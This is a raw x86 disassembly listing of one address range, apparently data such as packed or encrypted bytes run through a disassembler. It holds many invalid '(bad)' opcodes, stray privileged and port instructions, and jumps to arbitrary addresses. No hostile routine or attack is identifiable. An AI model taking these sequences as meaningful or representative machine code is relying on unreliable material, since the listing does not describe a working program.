  41b34e:	fdivr  st,st(6)
  41b350:	pop    ebp
  41b351:	pop    esp
  41b352:	in     al,dx
  41b353:	adc    eax,0xeadb3632
  41b358:	pop    edx
  41b359:	aad    0x7c
  41b35b:	mov    dh,0x9
  41b35d:	rcl    DWORD PTR [eax+0x10226eb0],1
  41b363:	mov    esi,0x81be813a
  41b368:	mov    esp,0xdb641c32
  41b36d:	or     eax,0x5059e8c9
  41b372:	and    eax,0xe924f752
  41b377:	adc    al,BYTE PTR [ebp+0x343096c4]
  41b37d:	pop    esi
  41b37e:	mov    bl,0xc0
  41b380:	adc    DWORD PTR [edi],eax
  41b382:	sbb    BYTE PTR [esi],0x53
  41b385:	sbb    eax,0x2eb59254
  41b38a:	mov    al,ds:0x8d19f562
  41b38f:	icebp  
  41b390:	rol    DWORD PTR [ebx],0x42
  41b393:	lahf   
  41b394:	cmp    ah,BYTE PTR [ebx]
  41b396:	sub    ebp,DWORD PTR [ecx-0x60]
  41b399:	(bad)  
  41b39a:	sub    eax,0x829580a4
  41b39f:	push   ss
  41b3a0:	add    bh,BYTE PTR [ebp+0x3b]
  41b3a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3a4:	sbb    eax,0x1a71dba6
  41b3a9:	scas   eax,DWORD PTR es:[edi]
  41b3aa:	cli    
  41b3ab:	loop   0x41b42b
  41b3ad:	out    dx,eax
  41b3ae:	retf   
  41b3af:	cmp    BYTE PTR [ebx+ecx*1-0x326456f7],0xa2
  41b3b7:	mov    ecx,0x7a3356da
  41b3bc:	leave  
  41b3bd:	xor    eax,0x1d71eeb9
  41b3c2:	xchg   esp,eax
  41b3c3:	daa    
  41b3c4:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41b3c6:	(bad)  
  41b3c7:	jne    0x41b352
  41b3c9:	push   ebx
  41b3ca:	test   esi,edi
  41b3cc:	cmp    eax,0x8ba4f20
  41b3d1:	fnclex 
  41b3d3:	js     0x41b358
  41b3d5:	dec    edx
  41b3d6:	sbb    esi,DWORD PTR [edi]
  41b3d8:	xchg   ecx,eax
  41b3d9:	aaa    
  41b3da:	mov    edi,0x68af5a82
  41b3df:	js     0x41b3c4
  41b3e1:	ja     0x41b3a0
  41b3e3:	sbb    eax,0xec6592ff
  41b3e8:	jecxz  0x41b424
  41b3ea:	push   ds
  41b3eb:	and    BYTE PTR [ecx],dl
  41b3ed:	nop
  41b3ee:	inc    esi
  41b3ef:	jle    0x41b38b
  41b3f1:	adc    BYTE PTR [ebp*8-0x3cc4f95a],dh
  41b3f8:	sti    
  41b3f9:	stos   BYTE PTR es:[edi],al
  41b3fa:	aaa    
  41b3fb:	inc    ebx
  41b3fc:	xor    BYTE PTR [esi-0x78068e2],0x26
  41b403:	in     al,dx
  41b404:	test   DWORD PTR [edx+eiz*4+0x4980bf38],ecx
  41b40b:	les    esi,FWORD PTR [ebx+ecx*8+0x5a48afbe]
  41b412:	mov    esi,0xb1871e5f
  41b417:	mov    bh,0xe3
  41b419:	dec    ebx
  41b41a:	push   edi
  41b41b:	test   al,0xc8
  41b41d:	dec    ebx
  41b41e:	inc    edx
  41b41f:	int3   
  41b420:	cmp    BYTE PTR [esi-0x54],dl
  41b423:	xlat   BYTE PTR ds:[ebx]
  41b424:	aas    
  41b425:	test   DWORD PTR [edi+0x17],eax
  41b428:	dec    edx
  41b429:	dec    esi
  41b42a:	outs   dx,BYTE PTR ds:[esi]
  41b42b:	stos   BYTE PTR es:[edi],al
  41b42c:	ror    DWORD PTR [edx+0x2a070577],0x8b
  41b433:	pop    ss
  41b434:	push   eax
  41b435:	jmp    0xd35deadd
  41b43a:	mov    dl,0x53
  41b43c:	sub    al,0x14
  41b43e:	imul   eax,esi,0x9
  41b441:	(bad)  
  41b442:	xor    DWORD PTR [ebx],ecx
  41b444:	into   
  41b445:	adc    BYTE PTR [esi+edi*8],al
  41b448:	xlat   BYTE PTR ds:[ebx]
  41b449:	std    
  41b44a:	sti    
  41b44b:	pop    esi
  41b44c:	je     0x41b40b
  41b44e:	push   ss
  41b44f:	(bad)  
  41b450:	rcl    BYTE PTR [ecx],0x1b
  41b453:	push   ds
  41b454:	mov    esp,DWORD PTR [ebp+0x77]
  41b457:	push   ebx
  41b458:	dec    edx
  41b459:	mov    eax,0x77c8c16
  41b45e:	inc    edx
  41b45f:	xchg   esi,eax
  41b460:	(bad)  
  41b461:	loopne 0x41b4c1
  41b463:	fwait
  41b464:	fs int 0x62
  41b467:	je     0x41b49a
  41b469:	mov    esi,0xfcbc2b2
  41b46e:	jg     0x41b488
  41b470:	sahf   
  41b471:	imul   esi,edi,0xffffff8a
  41b474:	call   0x1d56d3c8
  41b479:	push   ss
  41b47a:	pop    esi
  41b47b:	mov    esi,0xbbf95229
  41b480:	mov    dl,0xdc
  41b482:	dec    edi
  41b483:	dec    eax
  41b484:	stos   DWORD PTR es:[edi],eax
  41b485:	and    ebx,DWORD PTR [edi]
  41b487:	icebp  
  41b488:	or     BYTE PTR [ebx-0x60f3f1e],dl
  41b48e:	lea    ecx,[eax]
  41b490:	aas    
  41b491:	stos   DWORD PTR es:[edi],eax
  41b492:	and    BYTE PTR [esi-0x704cf497],ch
  41b498:	adc    esp,edx
  41b49a:	icebp  
  41b49b:	inc    edi
  41b49c:	in     al,0x8c
  41b49e:	mov    esi,0xb0f020ff
  41b4a3:	fnsave [edi-0x19]
  41b4a6:	fisub  WORD PTR [ebp-0x580972b9]
  41b4ac:	add    eax,0x197a7d01
  41b4b1:	add    esp,ebp
  41b4b3:	retf   0xfe22
  41b4b6:	mov    esp,0xe2751b16
  41b4bb:	sub    BYTE PTR [eax],0xe1
  41b4be:	pop    edx
  41b4bf:	dec    esi
  41b4c0:	in     al,0xc3
  41b4c2:	pop    eax
  41b4c3:	lods   eax,DWORD PTR ds:[esi]
  41b4c4:	pop    esi
  41b4c5:	or     al,0xd2
  41b4c7:	call   0xfb4b956a
  41b4cc:	push   0xf2c7bd3c
  41b4d1:	popa   
  41b4d2:	pushf  
  41b4d3:	sub    DWORD PTR ds:0x43734564,edx
  41b4d9:	ret    0xa2bf
  41b4dc:	loop   0x41b4b2
  41b4de:	adc    ebp,DWORD PTR [edx+edi*2]
  41b4e1:	dec    ecx
  41b4e2:	gs push ecx
  41b4e4:	jp     0x41b4ae
  41b4e6:	loopne 0x41b4e7
  41b4e8:	movq   QWORD PTR [ebx],mm3
  41b4eb:	out    0xda,eax
  41b4ed:	sbb    bl,BYTE PTR [esi+0x61aaf941]
  41b4f3:	pop    esi
  41b4f4:	hlt    
  41b4f5:	fiadd  WORD PTR [ebx+0x24]
  41b4f8:	fcomip st,st(1)
  41b4fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4fb:	enter  0xd219,0xf9
  41b4ff:	jae    0x41b522
  41b501:	xchg   ebx,eax
  41b502:	je     0x41b547
  41b504:	inc    esi
  41b505:	sub    eax,DWORD PTR [ecx+0x150a0e8b]
  41b50b:	aad    0xd9
  41b50d:	sbb    eax,0x45e0cac0
  41b512:	mov    ds:0xf690b940,al
  41b517:	mov    esi,0x1d19dce4
  41b51c:	(bad)  
  41b51d:	sub    BYTE PTR [esi+0x57],cl
  41b520:	aad    0x54
  41b522:	pop    es
  41b523:	xor    al,0xee
  41b525:	shl    BYTE PTR [edi+0x113fd964],1
  41b52b:	fwait
  41b52c:	push   esi
  41b52d:	mov    esi,0xcc728dbf
  41b532:	arpl   WORD PTR ds:0x717f7f80,ax
  41b538:	call   0x9c6399d1
  41b53d:	sub    BYTE PTR [ecx],cl
  41b53f:	(bad)  
  41b540:	pusha  
  41b541:	(bad)  
  41b542:	jmp    0x41b4d2
  41b544:	dec    esp
  41b545:	xchg   edx,eax
  41b546:	mov    edx,DWORD PTR ds:0xe2f33f1
  41b54c:	jae    0x41b570
  41b54e:	jnp    0x41b567
  41b550:	cmp    edx,DWORD PTR [ebx+0x10cd8ad4]
  41b556:	aam    0x25
  41b558:	adc    eax,0xdb8f9694
  41b55d:	pop    es
  41b55e:	es jbe 0x41b567
  41b561:	cwde   
  41b562:	(bad)  
  41b563:	mov    dh,0xdf
  41b565:	push   cs
  41b566:	push   esi
  41b568:	mov    edx,DWORD PTR [ecx-0x63]
  41b56b:	add    edi,ecx
  41b56d:	addr16 popa 
  41b56f:	pop    esp
  41b570:	pop    ebx
  41b571:	and    bh,BYTE PTR [edi]
  41b573:	stos   DWORD PTR es:[edi],eax
  41b574:	(bad)  
  41b575:	mov    al,0x19
  41b577:	rcl    BYTE PTR [edx-0x6e1bf93b],1
  41b57d:	jmp    0x41b56b
  41b57f:	(bad)  
  41b580:	push   ebx
  41b581:	ja     0x41b596
  41b583:	pusha  
  41b584:	xor    BYTE PTR [esi],bl
  41b586:	imul   esi,DWORD PTR [edx+edx*8],0x6c
  41b58a:	std    
  41b58b:	adc    edi,DWORD PTR [edi-0x4a]
  41b58e:	push   ds
  41b58f:	adc    DWORD PTR [eax],0x73bb50e6
  41b595:	test   eax,0x8e42622d
  41b59a:	daa    
  41b59b:	(bad)  
  41b59c:	jge    0x41b581
  41b59e:	loop   0x41b5cd
  41b5a0:	xchg   ebp,eax
  41b5a1:	mov    edx,0x774c80e4
  41b5a6:	mov    dl,0xec
  41b5a8:	adc    BYTE PTR [esi],bh
  41b5aa:	xchg   DWORD PTR [ecx],eax
  41b5ac:	lock cmc 
  41b5ae:	pop    edx
  41b5af:	mov    bl,0x69
  41b5b1:	cmc    
  41b5b2:	and    esi,DWORD PTR [ebp+ecx*1+0x292034c4]
  41b5b9:	adc    BYTE PTR [esp+esi*1+0x40f1eefe],bh
  41b5c0:	lds    eax,FWORD PTR [edx]
  41b5c2:	xlat   BYTE PTR ds:[ebx]
  41b5c3:	adc    al,0xb4
  41b5c5:	mov    ecx,esp
  41b5c7:	xchg   edx,eax
  41b5c8:	sar    DWORD PTR [edx],1
  41b5ca:	sbb    DWORD PTR [eax-0x3ddf4ec4],eax
  41b5d0:	enter  0x55cd,0xdb
  41b5d4:	jbe    0x41b5c7
  41b5d6:	outs   dx,DWORD PTR ds:[esi]
  41b5d7:	xlat   BYTE PTR ds:[ebx]
  41b5d8:	pushf  
  41b5d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5da:	sbb    ebx,DWORD PTR [ebx]
  41b5dc:	dec    ecx
  41b5dd:	xchg   ebx,eax
  41b5de:	pop    edi
  41b5df:	cdq    
  41b5e0:	push   ebx
  41b5e1:	lea    eax,[ecx+0x7d]
  41b5e4:	aad    0x26
  41b5e6:	loope  0x41b5e6
  41b5e8:	jmp    0xd1c:0xd88c1825
  41b5ef:	mov    BYTE PTR [edi+0xa],dh
  41b5f2:	mov    eax,0xb23ef02
  41b5f7:	cs into 
  41b5f9:	dec    ecx
  41b5fa:	pop    ss
  41b5fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5fc:	jle    0x41b64a
  41b5fe:	loopne 0x41b5a0
  41b600:	dec    edi
  41b601:	imul   edx,edx,0xe
  41b604:	mov    ds:0x3d5955bb,eax
  41b609:	push   esp
  41b60a:	mov    eax,0x5c17fa3b
  41b60f:	pop    ebp
  41b610:	sbb    cl,BYTE PTR [edi]
  41b612:	cmp    eax,0x890fdc05
  41b617:	or     ebx,edx
  41b619:	repnz push ebx
  41b61b:	jecxz  0x41b60f
  41b61d:	inc    eax
  41b61e:	inc    ebp
  41b61f:	mov    ebp,0x4044c3e4
  41b624:	mov    bl,BYTE PTR [esi+edi*8-0x7a]
  41b628:	shl    DWORD PTR [ecx-0x4a],1
  41b62b:	jb     0x41b694
  41b62d:	push   edx
  41b62e:	jge    0x41b60b
  41b630:	or     dl,cl
  41b632:	inc    ecx
  41b633:	popa   
  41b634:	aas    
  41b635:	mov    eax,0x46a2526
  41b63a:	ficom  WORD PTR [ecx+edx*2]
  41b63d:	mov    al,0x5c
  41b63f:	sbb    eax,0x69972f39
  41b644:	shl    BYTE PTR [eax+eiz*1+0x55],0xd
  41b649:	sub    BYTE PTR ds:0x4f08063c,ch
  41b64f:	inc    ebp
  41b650:	mov    dl,0x5
  41b652:	pop    edx
  41b653:	inc    ebx
  41b654:	inc    ebp
  41b655:	add    al,0xbd
  41b657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b658:	push   ebx
  41b659:	ret    
  41b65a:	enter  0x7908,0x42
  41b65e:	cmp    al,0x17
  41b660:	and    BYTE PTR [eax+0x54],cl
  41b663:	mov    BYTE PTR [eax+0x5b571d91],al
  41b669:	loopne 0x41b64d
  41b66b:	xchg   edx,eax
  41b66c:	loop   0x41b5ee
  41b66e:	inc    esp
  41b66f:	xchg   ecx,eax
  41b670:	or     dl,cl
  41b672:	call   0x8ae85fe
  41b677:	pop    ds
  41b678:	fcom   QWORD PTR [ebp-0x764c2107]
  41b67e:	ss mov eax,0xe15ff7c2
  41b684:	mov    bh,0x4d
  41b686:	loope  0x41b669
  41b688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b689:	and    ch,BYTE PTR [ecx-0x40]
  41b68c:	std    
  41b68d:	fldenv [ebx-0x73ac90ee]
  41b693:	xor    eax,0x29aded08
  41b698:	les    ebx,FWORD PTR [esi+0x6386e4c0]
  41b69e:	add    al,0x2f
  41b6a0:	call   0xcf70:0xe06e5d25
  41b6a7:	dec    edi
  41b6a8:	lss    edx,FWORD PTR [ecx+0x1e49f52c]
  41b6af:	dec    edx
  41b6b0:	leave  
  41b6b1:	dec    ebp
  41b6b2:	push   ds
  41b6b3:	mov    dh,0x37
  41b6b5:	mov    WORD PTR [ebx+0x704ac675],fs
  41b6bb:	out    dx,eax
  41b6bc:	cmp    DWORD PTR [edi+0xb],edx
  41b6bf:	mov    cl,0xca
  41b6c1:	dec    ecx
  41b6c2:	(bad)  
  41b6c3:	cli    
  41b6c4:	add    DWORD PTR [eax+0x4b],0xb2d98ddb
  41b6cb:	mov    ch,0xdf
  41b6cd:	into   
  41b6ce:	mov    ebp,0x86fc84ed
  41b6d3:	add    DWORD PTR ds:0xa0d26d82,eax
  41b6d9:	mov    ch,0xa9
  41b6db:	sub    DWORD PTR [edi-0x1b],edx
  41b6de:	push   0xff8b0591
  41b6e3:	cs jl  0x41b756
  41b6e6:	cmp    edx,edx
  41b6e8:	ins    DWORD PTR es:[edi],dx
  41b6e9:	(bad)  
  41b6ea:	fnstcw WORD PTR [edx+0x27ae2598]
  41b6f0:	xchg   ecx,eax
  41b6f1:	adc    BYTE PTR [ebx+0x557d96ba],bl
  41b6f7:	xor    edi,esi
  41b6f9:	adc    cl,dh
  41b6fb:	or     eax,0xae6e485f
  41b700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b701:	sub    ah,BYTE PTR [ebp-0x51]
  41b704:	(bad)
  41b707:	dec    edi
  41b708:	mov    ecx,0x3d2ed7ca
  41b70d:	bound  ebp,QWORD PTR [esi]
  41b70f:	in     al,0xe7
  41b711:	dec    esi
  41b712:	adc    eax,0xbf46d6df
  41b717:	sub    ch,BYTE PTR [edx+eax*8+0x1fc011c1]
  41b71e:	push   ds
  41b71f:	iret   
  41b720:	fsubr  DWORD PTR [esi]
  41b722:	ficom  DWORD PTR [ebp+0x64d3fc35]
  41b728:	mov    bl,0xe8
  41b72a:	xor    bh,bl
  41b72c:	ins    BYTE PTR es:[edi],dx
  41b72d:	shl    BYTE PTR [esi+0x1d4d1896],cl
  41b733:	adc    DWORD PTR [edx],0xabae9e4a
  41b739:	add    BYTE PTR ds:0x50d9214f,ch
  41b73f:	sub    dh,dl
  41b741:	add    al,0xf6
  41b743:	(bad)  
  41b744:	mov    edi,0x5994355f
  41b749:	into   
  41b74a:	leave  
  41b74b:	mov    cl,0xb4
  41b74d:	(bad)  
  41b74e:	test   al,0x89
  41b750:	sbb    DWORD PTR [esi],ecx
  41b752:	cwde   
  41b753:	and    al,0x5f
  41b755:	clc    
  41b756:	in     al,dx
  41b757:	fiadd  WORD PTR [edi+0x47]
  41b75a:	add    BYTE PTR [esi-0x11204ea3],dh
  41b760:	xchg   BYTE PTR [esi+0x444abba7],ah
  41b766:	lods   al,BYTE PTR ds:[esi]
  41b767:	popf   
  41b768:	mov    al,ds:0xad065e54
  41b76d:	pop    ebx
  41b76e:	push   cs
  41b76f:	int    0x3
  41b771:	and    edx,edi
  41b773:	(bad)  
  41b774:	push   edi
  41b775:	cmp    BYTE PTR [ebp+0x4f],bh
  41b778:	out    dx,al
  41b779:	call   0xf22a1a2a
  41b77e:	adc    eax,0xb1632ffb
  41b783:	jne    0x41b7a4
  41b785:	xchg   esp,eax
  41b786:	ja     0x41b780
  41b788:	call   0x920b1271
  41b78d:	sub    BYTE PTR [edx-0x25],ah
  41b790:	call   0x7f6f34b4
  41b795:	test   BYTE PTR [eax+0x79a21d79],ch
  41b79b:	and    al,0xbf
  41b79d:	scas   eax,DWORD PTR es:[edi]
  41b79e:	(bad)  
  41b79f:	loopne 0x41b784
  41b7a1:	jle    0xbf5e4a1e
  41b7a7:	fist   DWORD PTR [esi-0x45]
  41b7aa:	es push eax
  41b7ac:	and    ecx,DWORD PTR [esi+0xf]
  41b7af:	pop    edx
  41b7b0:	mov    gs,WORD PTR [esi]
  41b7b2:	dec    ebx
  41b7b3:	in     eax,dx
  41b7b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b5:	daa    
  41b7b6:	mov    ah,0x1d
  41b7b8:	push   ds
  41b7b9:	clc    
  41b7ba:	hlt    
  41b7bb:	cmp    eax,0x6df1c2d9
  41b7c0:	and    ecx,DWORD PTR [esi]
  41b7c2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7c4:	jge    0x41b74e
  41b7c6:	mov    ch,0x13
  41b7c8:	add    eax,0xb1b08e9a
  41b7cd:	mov    edi,0x4d2406a1
  41b7d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7d3:	mov    bh,0x98
  41b7d5:	lods   eax,DWORD PTR ds:[esi]
  41b7d6:	sub    ch,dl
  41b7d8:	and    ah,cl
  41b7da:	cli    
  41b7db:	xor    DWORD PTR [edx-0x2c],esp
  41b7de:	jecxz  0x41b79f
  41b7e0:	pop    edx
  41b7e1:	mov    ebx,0x6eb0bae9
  41b7e6:	es retf 0xbc8b
  41b7ea:	push   ss
  41b7eb:	in     eax,0x57
  41b7ed:	iret   
  41b7ee:	mov    eax,ds:0x3fbe5810
  41b7f3:	test   BYTE PTR [ebx+0x6a6c1241],cl
  41b7f9:	repnz pop edi
  41b7fb:	ds jo  0x41b84a
  41b7fe:	stc    
  41b7ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b800:	ins    DWORD PTR es:[edi],dx
  41b801:	out    dx,al
  41b802:	repz aas 
  41b804:	fcomp  DWORD PTR [eax-0x25781087]
  41b80a:	lahf   
  41b80b:	test   al,0x94
  41b80d:	inc    ebx
  41b80e:	push   edx
  41b80f:	xor    al,0x66
  41b811:	loopne 0x41b817
  41b813:	test   BYTE PTR [eax],bl
  41b815:	add    dh,BYTE PTR ds:0x5a7b8caa
  41b81b:	sahf   
  41b81c:	xor    eax,0x185e89a7
  41b821:	shl    DWORD PTR [ebp+0x2],cl
  41b824:	out    dx,al
  41b825:	stos   DWORD PTR es:[edi],eax
  41b826:	(bad)  
  41b828:	(bad)  
  41b829:	pusha  
  41b82a:	aam    0x59
  41b82c:	mov    ecx,0xc873355
  41b831:	xor    DWORD PTR [edi+0x55],0x153b0afe
  41b838:	ret    
  41b839:	scas   al,BYTE PTR es:[edi]
  41b83a:	add    eax,DWORD PTR [ecx+0x27a2b6b0]
  41b840:	test   eax,0x8931eff9
  41b845:	fadd   QWORD PTR [edi+0x1e238050]
  41b84b:	push   ecx
  41b84c:	jbe    0x41b896
  41b84e:	jmp    ecx
  41b850:	push   ss
  41b851:	test   BYTE PTR [ebp-0x4f64ef23],bl
  41b857:	or     esi,DWORD PTR [ecx+edx*1-0x745283d7]
  41b85e:	mov    edx,0xc1649f56
  41b863:	mov    ch,al
  41b865:	and    eax,DWORD PTR [ecx]
  41b867:	es xchg edx,eax
  41b869:	sub    ebp,edi
  41b86b:	dec    esi
  41b86c:	into   
  41b86d:	inc    esi
  41b86e:	xchg   esi,eax
  41b86f:	fwait
  41b870:	test   eax,0x226416ca
  41b875:	jmp    0x41b862
  41b877:	fwait
  41b878:	in     eax,0x52
  41b87a:	ror    ch,1
  41b87c:	cmp    ah,bl
  41b87e:	jge    0x41b89d
  41b880:	nop
  41b881:	sub    eax,0x379d5b88
  41b886:	lea    ebp,[ecx-0x2a85f256]
  41b88c:	out    dx,al
  41b88d:	mov    cl,0x87
  41b88f:	add    DWORD PTR [ebx+0x1a],ebx
  41b892:	(bad)  
  41b893:	(bad)  
  41b894:	xor    BYTE PTR [edi+0x6edf5d4a],ah
  41b89a:	jno    0x41b87f
  41b89c:	es push ebx
  41b89e:	sbb    eax,0xbef4b89c
  41b8a3:	fdivr  DWORD PTR [edi]
  41b8a5:	mov    ecx,0x2c5a562
  41b8aa:	test   DWORD PTR [eax],edx
  41b8ac:	aam    0xdb
  41b8ae:	cmc    
  41b8af:	std    
  41b8b0:	pop    esi
  41b8b1:	xlat   BYTE PTR ds:[ebx]
  41b8b2:	jge    0x41b919
  41b8b4:	sbb    BYTE PTR [ecx+0x22cdf9c6],cl
  41b8ba:	sub    eax,DWORD PTR [ebp-0x6911da28]
  41b8c0:	ret    0xe4e5
  41b8c3:	sahf   
  41b8c4:	push   edx
  41b8c5:	es ret 
  41b8c7:	sbb    DWORD PTR [ebp-0x5770107c],ebx
  41b8cd:	adc    esp,ebx
  41b8cf:	ror    BYTE PTR [ecx+0x30],cl
  41b8d2:	jecxz  0x41b8d4
  41b8d4:	and    esi,DWORD PTR [edx-0x23]
  41b8d7:	test   eax,0xda502506
  41b8dc:	mov    dl,0x5a
  41b8de:	hlt    
  41b8df:	mov    al,ds:0x9dd22cc3
  41b8e4:	mov    gs,ebp
  41b8e6:	xchg   ebx,eax
  41b8e7:	jg     0x41b8e2
  41b8e9:	js     0x41b8bd
  41b8eb:	nop
  41b8ec:	jb     0x41b95c
  41b8ee:	repz aas 
  41b8f0:	push   0x63d71ccd
  41b8f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8f7:	fsubr  st,st(5)
  41b8f9:	cmp    eax,0xaf8e026f
  41b8fe:	add    DWORD PTR [ebp-0x52a05ff9],ebx
  41b904:	jns    0x41b8ed
  41b906:	sar    DWORD PTR [edi+0xa],cl
  41b909:	into   
  41b90a:	test   edi,0x1d720ba
  41b910:	inc    edi
  41b911:	dec    edi
  41b912:	fiadd  WORD PTR [edi]
  41b914:	cmp    dl,ch
  41b916:	cmp    DWORD PTR [ebp-0x77e5969],ecx
  41b91c:	jle    0x41b994
  41b91e:	cld    
  41b91f:	sbb    edi,DWORD PTR [ecx-0x58]
  41b922:	and    ecx,ecx
  41b924:	call   0xe7b4:0x8a73e3ae
  41b92b:	xchg   ecx,eax
  41b92c:	cmc    
  41b92d:	dec    esp
  41b92e:	test   DWORD PTR [edi+eax*4-0x3c],esi
  41b932:	adc    ecx,DWORD PTR [esi+edx*2]
  41b935:	ins    BYTE PTR es:[edi],dx
  41b936:	fs dec ecx
  41b938:	mov    ds:0xc1160d68,eax
  41b93d:	aas    
  41b93e:	sbb    eax,DWORD PTR [esi+0x66764358]
  41b944:	fnstsw WORD PTR [ecx-0x24]
  41b947:	cs in  al,dx
  41b949:	es jmp 0x8b54:0xdf995280
  41b951:	in     al,dx
  41b952:	out    0x4f,al
  41b954:	cmp    DWORD PTR [ebx-0x1d6c3f03],ebx
  41b95a:	enter  0xe578,0xfd
  41b95e:	xchg   esi,eax
  41b95f:	lods   eax,DWORD PTR ds:[esi]
  41b960:	es mov ecx,0xac9051ac
  41b966:	aad    0xef
  41b968:	leave  
  41b969:	test   eax,0xa9ead2d6
  41b96e:	mov    ebp,0xfedd3a6f
  41b973:	inc    ebp
  41b974:	xlat   BYTE PTR ds:[ebx]
  41b975:	pusha  
  41b976:	(bad)  
  41b977:	int    0x58
  41b979:	sbb    ebx,DWORD PTR [edi]
  41b97b:	ret    0x7651
  41b97e:	test   eax,0x477c9935
  41b983:	aad    0xe
  41b985:	jo     0x41b9c6
  41b987:	rcl    ebp,cl
  41b989:	jmp    0x1f4eee51
  41b98e:	push   eax
  41b98f:	mov    bh,0x5c
  41b991:	fsub   st,st(6)
  41b993:	ins    DWORD PTR es:[edi],dx
  41b994:	std    
  41b995:	or     DWORD PTR [ecx],esi
  41b997:	sbb    dl,BYTE PTR [ebx+0x1e]
  41b99a:	mul    DWORD PTR [esi]
  41b99c:	inc    esi
  41b99d:	lahf   
  41b99e:	retf   
  41b99f:	sbb    eax,0x76ddcb16
  41b9a4:	mov    esi,0x89b48d6
  41b9a9:	sbb    esi,DWORD PTR [esi+0x76]
  41b9ac:	lock mov ah,0x95
  41b9af:	js     0x41b9e7
  41b9b1:	jns    0x41b946
  41b9b3:	inc    edi
  41b9b4:	clc    
  41b9b5:	in     eax,dx
  41b9b6:	ds sbb al,0x5a
  41b9b9:	imul   esp,DWORD PTR [eax+0x12],0xf12de949
  41b9c0:	fsubr  st,st(5)
  41b9c2:	sbb    eax,0x33b85800
  41b9c7:	shr    DWORD PTR ds:0xc0500655,0x3
  41b9ce:	pop    es
  41b9cf:	in     eax,0x47
  41b9d1:	mov    eax,ds:0x3e447dca
  41b9d6:	or     DWORD PTR [esi+0x2f],0x4e
  41b9da:	dec    eax
  41b9db:	cmp    al,0xac
  41b9dd:	mov    ah,al
  41b9df:	sar    BYTE PTR [edi],1
  41b9e1:	cmp    al,BYTE PTR [edi+eiz*8-0x29]
  41b9e5:	and    BYTE PTR [ebp-0x12],al
  41b9e8:	fsub   st(3),st
  41b9ea:	mov    cl,0xbb
  41b9ec:	jmp    0x9782740
  41b9f1:	dec    ecx
  41b9f2:	adc    BYTE PTR [eax],0x71
  41b9f5:	fidiv  WORD PTR [eax-0x62404327]
  41b9fb:	cmp    BYTE PTR [eax-0x70],ah
  41b9fe:	jae    0x41ba12
  41ba00:	fs (bad) 
  41ba02:	aad    0xbb
  41ba04:	out    dx,eax
  41ba05:	pusha  
  41ba06:	pop    ebp
  41ba07:	(bad)  
  41ba08:	loop   0x41b9bc
  41ba0a:	push   cs
  41ba0b:	push   edx
  41ba0c:	fcmovne st,st(1)
  41ba0e:	or     eax,0x3ae56669
  41ba13:	mov    bl,0xfb
  41ba15:	jns    0x41b9f7
  41ba17:	aaa    
  41ba18:	add    al,BYTE PTR [edi]
  41ba1a:	xchg   ebx,eax
  41ba1b:	test   al,0x85
  41ba1d:	stos   DWORD PTR es:[edi],eax
  41ba1e:	dec    esp
  41ba1f:	mov    eax,ds:0x1198dca7
  41ba24:	jne    0x41ba04
  41ba26:	scas   eax,DWORD PTR es:[edi]
  41ba27:	jnp    0x41ba60
  41ba29:	out    dx,al
  41ba2a:	xchg   edi,eax
  41ba2b:	call   0x964a2940
  41ba30:	or     al,ch
  41ba32:	jle    0x41ba98
  41ba34:	stos   DWORD PTR es:[edi],eax
  41ba35:	iret   
  41ba36:	fimul  DWORD PTR [edx]
  41ba38:	das    
  41ba39:	add    al,0x1e
  41ba3b:	add    ebp,edx
  41ba3d:	(bad)  
  41ba3e:	mov    bh,0xd7
  41ba40:	cmp    DWORD PTR [eax-0x2d7e14ae],ebx
  41ba46:	imul   ebx,ebp,0xa94b9d59
  41ba4c:	push   eax
  41ba4d:	xor    ecx,ebx
  41ba4f:	jbe    0x41ba66
  41ba51:	ins    BYTE PTR es:[edi],dx
  41ba52:	repz adc ebp,DWORD PTR [edi]
  41ba55:	sub    ebx,DWORD PTR [esi]
  41ba57:	ins    DWORD PTR es:[edi],dx
  41ba58:	push   edx
  41ba59:	jmp    0x41ba43
  41ba5b:	jg     0x41ba23
  41ba5d:	popa   
  41ba5e:	outs   dx,DWORD PTR ds:[esi]
  41ba5f:	(bad)  
  41ba60:	out    0xb5,eax
  41ba62:	call   0xb97e0d60
  41ba67:	ins    DWORD PTR es:[edi],dx
  41ba68:	sbb    eax,0xb4a529ac
  41ba6d:	inc    eax
  41ba6e:	xchg   edx,eax
  41ba6f:	xor    BYTE PTR [eax],dh
  41ba71:	mov    ebx,esi
  41ba73:	test   eax,esp
  41ba75:	xchg   edx,eax
  41ba76:	bound  edx,QWORD PTR [eax+0x243da029]
  41ba7c:	lea    edx,[edi+ebp*8]
  41ba7f:	inc    eax
  41ba80:	fisub  DWORD PTR [ebx+0x3e]
  41ba83:	push   edx
  41ba84:	sub    eax,0x234654ce
  41ba89:	inc    edi
  41ba8a:	mov    al,ds:0xe66871f2
  41ba8f:	dec    edi
  41ba90:	dec    eax
  41ba91:	dec    edi
  41ba92:	mov    BYTE PTR [edi+eax*2+0x37c1fde4],bl
  41ba99:	push   esi
  41ba9a:	hlt    
  41ba9b:	push   0xfdc5dd8d
  41baa0:	mov    al,ds:0xe6acc80a
  41baa5:	inc    esp
  41baa6:	sahf   
  41baa7:	loope  0x41bb1a
  41baa9:	hlt    
  41baaa:	xchg   edi,eax
  41baab:	mov    dh,ch
  41baad:	mov    al,0x35
  41baaf:	loopne 0x41bad4
  41bab1:	lods   eax,DWORD PTR ds:[esi]
  41bab2:	push   ss
  41bab3:	lahf   
  41bab4:	mov    eax,0xd386c56a
  41bab9:	(bad)  [esi]
  41babb:	dec    esi
  41babc:	int3   
  41babd:	dec    edx
  41babe:	pushf  
  41babf:	inc    edx
  41bac0:	or     dl,BYTE PTR [edi]
  41bac2:	aaa    
  41bac3:	lods   al,BYTE PTR ds:[esi]
